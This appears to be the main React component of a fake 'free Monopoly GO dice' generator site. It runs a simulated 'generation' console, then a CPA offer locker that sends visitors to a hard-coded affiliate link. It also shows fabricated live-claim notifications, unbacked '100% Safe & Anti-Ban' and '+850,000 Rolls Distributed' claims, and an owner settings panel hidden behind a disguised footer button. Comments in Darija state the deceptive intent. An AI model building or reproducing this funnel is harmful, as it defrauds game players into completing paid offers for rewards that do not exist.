import React, { useState, useEffect } from 'react';
import { Platform, RewardPackage, Language, CpaConfig } from './types';
import { translations } from './translations';
import { Navbar } from './components/Navbar';
import { CompactSteps } from './components/CompactSteps';
import { UserForm } from './components/UserForm';
import { DirectClaimFlow } from './components/DirectClaimFlow';
import { PackageSelector, packages } from './components/PackageSelector';
import { ConsoleModal } from './components/ConsoleModal';
import { CpaLockerModal } from './components/CpaLockerModal';
import { LiveToasts } from './components/LiveToasts';
import { CpaConfigModal } from './components/CpaConfigModal';
import { FaqAndProof } from './components/FaqAndProof';
import { RedDiceIcon, GoldDiceIcon, MonopolyCashIcon } from './components/Icons';
import { ShieldCheck, Flame, Users, Sparkles } from 'lucide-react';

const STORAGE_CPA_KEY = 'monopoly_cpa_config';

export default function App() {
  const [currentLang, setCurrentLang] = useState<Language>('en');
  const [username, setUsername] = useState('');
  const [platform, setPlatform] = useState<Platform>('android');
  const [encryption, setEncryption] = useState(true);

  // Multi-screen view state: 1 = Enter Username, 2 = Choose Package, 3 = Generation, 4 = CPA Locker
  const [activeStep, setActiveStep] = useState<1 | 2>(1);
  const [selectedPackage, setSelectedPackage] = useState<RewardPackage | null>(packages[1]); // Default to popular
  const [isGenerating, setIsGenerating] = useState(false);
  const [showLocker, setShowLocker] = useState(false);
  const [showConfigModal, setShowConfigModal] = useState(false);

  // CPA link configuration
  const DEFAULT_CPA_URL = 'https://app.trcefy.com/click?pid=2&offer_id=23755&sub2=u783751&sub5=s1SUBID1HERE';

  const [cpaConfig, setCpaConfig] = useState<CpaConfig>(() => {
    const saved = localStorage.getItem(STORAGE_CPA_KEY);
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (parsed && parsed.lockerUrl && !parsed.lockerUrl.includes('example.com') && !parsed.lockerUrl.includes('id=6a2050db46d3cf0d62f32aa4')) {
          return parsed;
        }
      } catch (e) {
        // ignore fallback
      }
    }
    return {
      lockerUrl: DEFAULT_CPA_URL,
      networkName: 'Offer 23755',
      autoRedirect: true,
    };
  });

  const t = translations[currentLang];

  const handleSaveCpaConfig = (newConfig: CpaConfig) => {
    setCpaConfig(newConfig);
    localStorage.setItem(STORAGE_CPA_KEY, JSON.stringify(newConfig));
  };

  const handleProceedToPackages = () => {
    setActiveStep(2);
    // Smooth scroll to top of workspace
    window.scrollTo({ top: 120, behavior: 'smooth' });
  };

  const handleBackToUserForm = () => {
    setActiveStep(1);
    window.scrollTo({ top: 120, behavior: 'smooth' });
  };

  const handleClaimPackage = (pkg: RewardPackage) => {
    setSelectedPackage(pkg);
    // If username is empty, prompt user to input first
    if (!username.trim()) {
      setActiveStep(1);
      return;
    }
    // Launch generator console (Step 3)
    setIsGenerating(true);
  };

  const handleFinishGeneration = () => {
    setIsGenerating(false);
    setShowLocker(true);
  };

  return (
    <div
      dir="ltr"
      className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans selection:bg-amber-400 selection:text-slate-950"
    >
      {/* Top Navbar */}
      <Navbar
        currentLang={currentLang}
        onLanguageChange={setCurrentLang}
        onOpenCpaSettings={() => setShowConfigModal(true)}
      />

      {/* Hero Section */}
      <section className="relative pt-8 pb-6 sm:pt-12 sm:pb-8 overflow-hidden">
        {/* Background ambient lighting */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[350px] bg-gradient-to-tr from-red-600/15 via-amber-500/15 to-emerald-500/10 blur-3xl pointer-events-none rounded-full" />

        <div className="max-w-5xl mx-auto px-4 sm:px-6 text-center relative z-10">
          {/* Top trust tag */}
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-900/80 border border-amber-500/30 text-amber-400 text-xs font-semibold mb-4 shadow-sm">
            <Flame className="w-3.5 h-3.5 text-red-500" />
            <span>{currentLang === 'fr' ? 'OFFRE LIMITÉE - DISTRIBUTION QUOTIDIENNE' : 'LIMITED TIME DAILY ROLL DROP'}</span>
            <span className="text-slate-500">·</span>
            <span className="text-slate-300">2026 Season</span>
          </div>

          {/* Main Headline */}
          <h1 className="text-3xl sm:text-5xl lg:text-6xl font-black tracking-tight text-white font-heading leading-tight sm:leading-tight">
            {currentLang === 'fr' ? (
              <>
                Obtenez des <span className="text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-amber-400 to-yellow-400">Dés Gratuits Monopoly GO</span> sur votre compte
              </>
            ) : (
              <>
                Claim Free <span className="text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-amber-400 to-yellow-400">Monopoly GO Dice Rolls</span> Today
              </>
            )}
          </h1>

          <p className="text-xs sm:text-sm text-slate-300 max-w-2xl mx-auto mt-3 leading-relaxed">
            {t.heroSubtitle}
          </p>

          {/* Stat metrics */}
          <div className="flex flex-wrap items-center justify-center gap-4 sm:gap-8 mt-5 text-xs text-slate-400">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>{currentLang === 'fr' ? '100% Sécurisé & Anti-Ban' : '100% Safe & Anti-Ban'}</span>
            </div>
            <div className="flex items-center gap-2">
              <Sparkles className="w-4 h-4 text-amber-400" />
              <span>{currentLang === 'fr' ? '+850 000 dés distribués' : '+850,000 Rolls Distributed'}</span>
            </div>
            <div className="flex items-center gap-2">
              <Users className="w-4 h-4 text-cyan-400" />
              <span>{currentLang === 'fr' ? 'Sans mot de passe requis' : 'No Password Required'}</span>
            </div>
          </div>
        </div>
      </section>

      {/* Compact Interactive Progress Header */}
      <CompactSteps
        currentLang={currentLang}
        currentStep={2}
      />

      {/* Main Streamlined Claim Experience */}
      <main className="flex-1 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pb-12 w-full">
        <DirectClaimFlow
          currentLang={currentLang}
          username={username}
          setUsername={setUsername}
          platform={platform}
          setPlatform={setPlatform}
          selectedPackage={selectedPackage || packages[1]}
          onSelectPackage={setSelectedPackage}
          cpaConfig={cpaConfig}
        />

        {/* Social Proof & FAQ */}
        <div className="mt-14">
          <FaqAndProof currentLang={currentLang} />
        </div>
      </main>

      {/* Live Activity Notifications in the corner ("fjnb katih bhal ich3arat dyal nass li khdat") */}
      <LiveToasts currentLang={currentLang} />

      {/* Console Simulation Modal */}
      {isGenerating && selectedPackage && (
        <ConsoleModal
          currentLang={currentLang}
          username={username}
          platform={platform}
          pkg={selectedPackage}
          onFinish={handleFinishGeneration}
        />
      )}

      {/* CPA Offer Locker Modal ("kaytih lih offre cpa") */}
      {showLocker && selectedPackage && (
        <CpaLockerModal
          currentLang={currentLang}
          username={username}
          pkg={selectedPackage}
          cpaConfig={cpaConfig}
          onOpenSettings={() => setShowConfigModal(true)}
          onClose={() => setShowLocker(false)}
        />
      )}

      {/* CPA Configuration Modal for Admin/Owner ("wahd chwia n3tik linnk bach diro") */}
      {showConfigModal && (
        <CpaConfigModal
          currentLang={currentLang}
          config={cpaConfig}
          onSave={handleSaveCpaConfig}
          onClose={() => setShowConfigModal(false)}
        />
      )}

      {/* Footer */}
      <footer className="border-t border-slate-900 bg-slate-950 py-8 text-xs text-slate-500">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <RedDiceIcon className="w-5 h-5" />
            <span className="font-bold text-slate-400">Monopoly GO™ Dice Portal</span>
            <span>© 2026. All rights reserved.</span>
          </div>

          <div className="flex items-center gap-4 text-[11px]">
            <a href="#activity" className="hover:text-slate-300 transition-colors">
              {t.recentClaimsTitle}
            </a>
            <a href="#faq" className="hover:text-slate-300 transition-colors">
              {t.faqTitle}
            </a>
            <span className="text-slate-800">·</span>
            <button
              type="button"
              onClick={() => setShowConfigModal(true)}
              className="text-slate-700 hover:text-slate-500 text-[10px]"
            >
              Portal Sync v2.4
            </button>
          </div>
        </div>

        <div className="max-w-7xl mx-auto px-4 sm:px-6 mt-4 pt-4 border-t border-slate-900/60 text-[10px] text-slate-600 text-center sm:text-left leading-relaxed">
          Disclaimer: This web application is a promotional reward portal. Monopoly GO is a registered trademark of Scopely and Hasbro. This site is not officially affiliated with or endorsed by Scopely. All game assets remain the property of their respective owners.
        </div>
      </footer>
    </div>
  );
}
